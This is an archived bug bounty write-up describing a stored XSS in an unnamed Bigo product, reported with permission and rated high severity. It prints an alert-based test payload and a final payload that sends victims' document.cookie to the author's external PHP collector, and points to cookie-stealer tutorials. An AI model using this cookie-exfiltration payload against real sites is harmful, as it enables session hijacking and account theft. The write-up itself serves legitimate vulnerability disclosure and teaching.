---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-14_380-xss-stored-in-bigo-bug-bounty-program.md
original_filename: 2021-07-14_380-xss-stored-in-bigo-bug-bounty-program.md
title: ($380) XSS STORED in Bigo Bug Bounty Program
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: 25548012cd6c31ec452ae86dbee87cf08fc2194d72edf0d988e90feb6efbb873
text_sha256: c46c11ad9b7c38a06e648ad33642cb5a6308089925954d5b6c86097a25d42f88
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# ($380) XSS STORED in Bigo Bug Bounty Program

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-14_380-xss-stored-in-bigo-bug-bounty-program.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `25548012cd6c31ec452ae86dbee87cf08fc2194d72edf0d988e90feb6efbb873`
- Text SHA256: `c46c11ad9b7c38a06e648ad33642cb5a6308089925954d5b6c86097a25d42f88`


## Content

---
title: "($380) XSS STORED in Bigo Bug Bounty Program"
page_title: "XSS STORED in Bigo Bug Bounty Program | by Aidil Arief | Medium"
url: "https://aidilarf.medium.com/380-xss-stored-in-bigo-bug-bounty-program-a8b9529adcc4"
authors: ["Aidil Arief"]
programs: ["Bigo"]
bugs: ["XSS"]
bounty: "380"
publication_date: "2021-07-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3508
scraped_via: "browseros"
---

# ($380) XSS STORED in Bigo Bug Bounty Program

XSS STORED in Bigo Bug Bounty Program
Aidil Arief
Follow
3 min read
·
Jul 14, 2021

271

7

Assalamualaikum Bug Hunter and Hallo Everyone.

How are you?
I hope you are all well.

This time I will share about writing up bug findings in the Bigo Bug Bounty Program.

This discovery began after I managed to find a vulnerability from the Bigo Bug Bounty program. At that time I thought that the same vulnerability I found earlier was either no longer there or had been completely fixed by Bigo SRC. When I have free time, I try to find it again and check it again. And I got a similar vulnerability before. Come follow me :D

The vulnerability I found was in the form of XSS STORED. Sorry if I didn’t mention which app these findings are in. Because Bigo SRC did not give me permission to name the product I found the vulnerability.

And this started when I found a feature POST data from the application to the website.

Then I tried to POST the data from the application by entering the payload:
“><img src=x onerror=alert(document.domain)>

When I see the POST data result on the product’s official website, and the payload is executed :D

I was surprised to see that. Then a pop up appears.

Press enter or click to view image in full size

Maybe I think this is enough to report to them. When I’ve sent a report to them, and they responded.

Something interesting here, where they asked me to take cookies.

Then I tried to fetch cookies from XSS HUNTER payload.

Get Aidil Arief’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

And see, it doesn’t work, the POST input only allows 120 words.

Press enter or click to view image in full size

I’m confused, how to get a cookie with a payload of 120 words?

At that time I immediately looked for references from articles on google and I got the solution, namely with XSS Cookie Stealling.

Here’s the reference :

s0wr0b1ndef/WebHacking101
This is a basic Reflected XSS attack to steal cookies from a user of a vulnerable website. The attack string comes from…

github.com

Membuat XSS Cookie Stealer | Mukhammad Akbar
Membuat XSS Cookie Stealer - JavaScript adalah salah satu bahasa yang paling umum digunakan di web. Dapat juga…

abaykan.com

How to Write an XSS Cookie Stealer in JavaScript to Steal Passwords
JavaScript is one of the most common languages used on the web. It can automate and animate website components, manage…

null-byte.wonderhowto.com

Next I created a php and txt file on my hosting.

Final payload :

“><img src=x onerror=this.src=’https://herroid1337.000webhostapp.com/m.php?cok='+document.cookie>

And the cookie has been captured.

Then I reported this to them, and finally my report was received with a HIGH severity status.

Timeline :

Report : 12/07/2021

Valid : 13/07/2021

Severity : HIGH
